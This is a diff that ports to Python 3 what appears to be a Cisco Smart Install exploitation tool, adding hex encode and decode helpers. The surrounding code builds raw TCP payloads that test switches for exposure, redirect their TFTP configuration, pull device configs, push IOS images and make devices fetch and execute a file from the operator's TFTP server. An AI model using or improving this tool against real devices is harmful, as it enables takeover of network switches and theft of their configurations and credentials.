@@ -10,12 +10,16 @@ import sys
 import subprocess
 import time
 import threading
+
+from codecs import encode, decode
+
+python_version = sys.version_info[0]
+
 try:
     import Queue as queue
 except ImportError:
     # Queue is queue in python3
-    print('[ERROR]: Does not support python3 yet!')
-    raise SystemExit
+    import queue
 
 def get_argm_from_user():  # Set arguments for running
     parser = argparse.ArgumentParser()
@@ -154,7 +158,7 @@ def conn_with_client(data, ip, mode=0):  # Set connection with remote client
                         print('[INFO]: {0} is not affected'.format(ip))
                         break
                     elif (len(data) == 24):
-                        if (data.encode('hex') == resp):
+                        if (hex_encode(data) == resp):
                             print('[INFO]: Smart Install Client feature active on {0}'.format(ip))
                             print('[INFO]: {0} is affected'.format(ip))
                             break
@@ -198,8 +202,8 @@ def test_device(current_ip): # Testing for smart install
 
     # print('[DEBUG]: Packet for sent: ' + sTcp)
     print('[INFO]: Sending TCP packet to %s ' % current_ip)
-    # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
-    conn_with_client(sTcp.decode('hex'), current_ip, mode=1)
+    # print('[DEBUG]: Decoded packet to sent: ' + hex_decode(sTcp))
+    conn_with_client(hex_decode(sTcp), current_ip, mode=1)
 
 def test_device_scheduler(hosts_to_scan_queue):
   while not hosts_to_scan_queue.empty():
@@ -221,20 +225,18 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
         sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
         sDump2 = '0' * (264 - len(fConf) * 2)
-        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
-            'hex') + sDump2
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + hex_encode(fConf) + sDump2
 
     elif mode == 'change_multi':
         if not os.path.isdir("tftp/conf") and not os.path.exists("tftp/conf"):
-            os.mkdir('tftp/conf', 0755);
+            os.mkdir('tftp/conf', 0o755);
         config_file = 'conf/' + current_ip + '.conf'
         fConf = 'tftp://' + my_ip + '/' + config_file
         sTime = '00:01'
 
         sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
         sDump2 = '0' * (264 - len(fConf) * 2)
-        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
-            'hex') + sDump2
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + hex_encode(fConf) + sDump2
 
     elif mode == 'get_config':
         # need more test with this payload ( "system:" may be more usefull then "nvram:"
@@ -246,9 +248,9 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
         sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
 
-        sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
-        sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
-        sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
+        sTcp = sTcp + hex_encode(c1) + '00' * (336 - len(c1))
+        sTcp = sTcp + hex_encode(c2) + '00' * (336 - len(c2))
+        sTcp = sTcp + hex_encode(c3) + '00' * (336 - len(c3))
 
     elif mode == 'update_ios':
         get_ios_for_tftp()
@@ -261,7 +263,7 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         else:
             sTcp += '%08x' % 0x801 + '%024x' % 0 + '%08x' % 1 + '%08x' % int(sTime[0:2]) + '%08x' % int(
                 sTime[3:5]) + '%08x' % 1
-        sTcp += fList.encode('hex') + '00' * (415 - len(fList)) + '01'
+        sTcp += hex_encode(fList) + '00' * (415 - len(fList)) + '01'
 
     elif mode == 'execute':
         exec_file = get_file_for_tftp('execute')
@@ -271,14 +273,14 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         c3 = 'tftp://' + my_ip + '/' + exec_file
 
         sTcp = '%08d' % 2 + '%08d' % 1 + '%08d' % 5 + '%08d' % 210 + '%08d' % 1
-        sTcp = sTcp + c1.encode('hex') + '00' * (128 - len(c1))
-        sTcp = sTcp + c2.encode('hex') + '00' * (264 - len(c2))
-        sTcp = sTcp + c3.encode('hex') + '00' * (131 - len(c3)) + '01'
+        sTcp = sTcp + hex_encode(c1) + '00' * (128 - len(c1))
+        sTcp = sTcp + hex_encode(c2) + '00' * (264 - len(c2))
+        sTcp = sTcp + hex_encode(c3) + '00' * (131 - len(c3)) + '01'
 
     # print('[DEBUG]: Packet for sent: ' + sTcp)
     print('[INFO]: Sending TCP packet to %s ' % current_ip)
-    # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
-    conn_with_client(sTcp.decode('hex'), current_ip)
+    # print('[DEBUG]: Decoded packet to sent: ' + hex_decode(sTcp))
+    conn_with_client(hex_decode(sTcp), current_ip)
 
 
 def main():
@@ -308,7 +310,7 @@ def main():
             test_device(current_ip)
 
     else:
-        tftp = subprocess.Popen(["python2.7", "sTFTP.py"])
+        tftp = subprocess.Popen(["python", "sTFTP.py"])
 
         if args.mode != 'change_multi' and args.mode != 'get_config':
             current_ip = args.IP
@@ -365,6 +367,19 @@ def main():
         time.sleep(60)
         tftp.terminate()
 
+# Version-agnostic functions to encode and decode hex strings
+
+def hex_encode(toEncode):
+    if python_version == 2:
+        return toEncode.encode('hex')
+    elif python_version == 3:
+        return encode(bytes(toEncode, 'ascii'), 'hex').decode()
+
+def hex_decode(toDecode):
+    if python_version == 2:
+        return toDecode.decode('hex')
+    elif python_version == 3:
+        return decode(toDecode, 'hex')
 
 main()
 
